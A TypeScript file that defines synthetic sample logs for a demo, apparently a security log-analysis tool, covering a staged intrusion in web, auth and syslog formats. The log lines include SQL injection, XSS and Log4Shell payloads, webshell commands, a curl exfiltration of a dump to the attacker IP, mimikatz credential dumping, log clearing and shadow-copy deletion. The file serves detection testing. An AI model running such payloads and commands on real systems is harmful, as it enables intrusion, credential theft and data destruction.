// =====================================================================
// 데모용 합성 로그 (REQ 제약: 실습·합성 데이터 사용)
// 침해 시나리오: 정찰 → SQLi/Log4Shell 침투 → 웹쉘 → 무차별대입 →
// 권한상승 → 로그삭제 → 데이터 유출. 모든 IP/값은 가공된 가짜 데이터.
// =====================================================================

export interface SampleSet {
  id: string;
  name: string;
  fileName: string;
  description: string;
  content: string;
}

const WEBLOG = `203.0.113.45 - - [12/Jun/2026:01:02:11 +0900] "GET / HTTP/1.1" 200 1043 "-" "Mozilla/5.0"
203.0.113.45 - - [12/Jun/2026:01:02:13 +0900] "GET /robots.txt HTTP/1.1" 404 209 "-" "Nmap Scripting Engine"
198.51.100.23 - - [12/Jun/2026:01:05:40 +0900] "GET /admin HTTP/1.1" 401 188 "-" "sqlmap/1.7.2#stable"
198.51.100.23 - - [12/Jun/2026:01:05:41 +0900] "GET /wp-admin HTTP/1.1" 404 188 "-" "sqlmap/1.7.2#stable"
198.51.100.23 - - [12/Jun/2026:01:05:42 +0900] "GET /phpmyadmin HTTP/1.1" 404 188 "-" "sqlmap/1.7.2#stable"
198.51.100.23 - - [12/Jun/2026:01:05:43 +0900] "GET /.env HTTP/1.1" 404 188 "-" "sqlmap/1.7.2#stable"
198.51.100.23 - - [12/Jun/2026:01:05:44 +0900] "GET /.git/config HTTP/1.1" 404 188 "-" "sqlmap/1.7.2#stable"
198.51.100.23 - - [12/Jun/2026:01:06:02 +0900] "GET /product?id=1' OR '1'='1 HTTP/1.1" 500 512 "-" "sqlmap/1.7.2"
198.51.100.23 - - [12/Jun/2026:01:06:05 +0900] "GET /product?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 2048 "-" "sqlmap/1.7.2"
198.51.100.23 - - [12/Jun/2026:01:06:09 +0900] "GET /search?q=<script>document.cookie</script> HTTP/1.1" 200 980 "-" "Mozilla/5.0"
45.155.205.99 - - [12/Jun/2026:01:11:30 +0900] "POST /api/login HTTP/1.1" 401 122 "-" "python-requests/2.31"
45.155.205.99 - - [12/Jun/2026:01:11:31 +0900] "POST /api/login HTTP/1.1" 401 122 "-" "python-requests/2.31"
45.155.205.99 - - [12/Jun/2026:01:11:32 +0900] "POST /api/login HTTP/1.1" 401 122 "-" "python-requests/2.31"
45.155.205.99 - - [12/Jun/2026:01:11:33 +0900] "POST /api/login HTTP/1.1" 401 122 "-" "python-requests/2.31"
45.155.205.99 - - [12/Jun/2026:01:11:34 +0900] "POST /api/login HTTP/1.1" 401 122 "-" "python-requests/2.31"
45.155.205.99 - - [12/Jun/2026:01:11:35 +0900] "POST /api/login HTTP/1.1" 401 122 "-" "python-requests/2.31"
45.155.205.99 - - [12/Jun/2026:01:11:38 +0900] "POST /api/login HTTP/1.1" 200 845 "-" "python-requests/2.31"
185.220.101.4 - - [12/Jun/2026:01:20:15 +0900] "GET /api/data HTTP/1.1" 200 320 "-" "\${jndi:ldap://185.220.101.4:1389/Exploit}"
185.220.101.4 - - [12/Jun/2026:01:20:44 +0900] "POST /upload.php HTTP/1.1" 200 64 "-" "Mozilla/5.0"
185.220.101.4 - - [12/Jun/2026:01:21:10 +0900] "GET /uploads/cmd.jsp?cmd=whoami HTTP/1.1" 200 42 "-" "curl/8.1.0"
185.220.101.4 - - [12/Jun/2026:01:21:55 +0900] "GET /uploads/cmd.jsp?cmd=cat /etc/passwd HTTP/1.1" 200 1290 "-" "curl/8.1.0"
185.220.101.4 - - [12/Jun/2026:01:23:05 +0900] "GET /uploads/cmd.jsp?cmd=curl http://185.220.101.4/x.zip --upload-file dump.zip HTTP/1.1" 200 88 "-" "curl/8.1.0"
10.0.0.12 - - [12/Jun/2026:01:30:00 +0900] "GET /dashboard HTTP/1.1" 200 4096 "-" "Mozilla/5.0"`;

const AUTH_CSV = `timestamp,source_ip,user,event,status
2026-06-12 01:11:30,45.155.205.99,admin,login_attempt,failed
2026-06-12 01:11:31,45.155.205.99,admin,login_attempt,failed
2026-06-12 01:11:32,45.155.205.99,administrator,login_attempt,failed
2026-06-12 01:11:33,45.155.205.99,root,login_attempt,failed
2026-06-12 01:11:34,45.155.205.99,admin,login_attempt,failed
2026-06-12 01:11:38,45.155.205.99,admin,login_success,success
2026-06-12 01:25:10,185.220.101.4,admin,powershell -enc SQBFAFgAKABO,process_exec,success
2026-06-12 01:26:40,185.220.101.4,admin,reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,persistence,success
2026-06-12 01:28:00,185.220.101.4,SYSTEM,mimikatz sekurlsa::logonpasswords,credential_dump,success
2026-06-12 01:35:00,185.220.101.4,SYSTEM,wevtutil cl Security,log_clear,success
2026-06-12 01:40:00,185.220.101.4,SYSTEM,vssadmin delete shadows /all,impact,success`;

const SYSLOG = `Jun 12 01:25:10 web01 sshd[2211]: Accepted password for admin from 45.155.205.99 port 51022
Jun 12 01:25:33 web01 sudo: admin : COMMAND=/bin/bash -i
Jun 12 01:26:01 web01 kernel: powershell -nop -w hidden -enc SQBFAFgAKAA=
Jun 12 01:27:14 web01 audit: psexec \\\\10.0.0.20 -u administrator cmd.exe
Jun 12 01:28:00 web01 audit: mimikatz.exe sekurlsa::logonpasswords
Jun 12 01:35:00 web01 audit: wevtutil cl System
Jun 12 01:42:00 web01 alert: files renamed to *.locked - ransom note dropped readme_decrypt.txt`;

export const SAMPLE_SETS: SampleSet[] = [
  {
    id: 'weblog',
    name: '웹 액세스 로그 (Combined)',
    fileName: 'access_2026-06-12.log',
    description: '정찰·SQLi·Log4Shell·웹쉘·유출 시나리오 포함',
    content: WEBLOG,
  },
  {
    id: 'authcsv',
    name: '인증/감사 로그 (CSV)',
    fileName: 'auth_audit.csv',
    description: '무차별대입·권한상승·자격증명덤프·로그삭제',
    content: AUTH_CSV,
  },
  {
    id: 'syslog',
    name: '시스템 로그 (Syslog)',
    fileName: 'syslog_web01.txt',
    description: 'SSH 접속·측면이동·랜섬웨어 영향 단계',
    content: SYSLOG,
  },
];
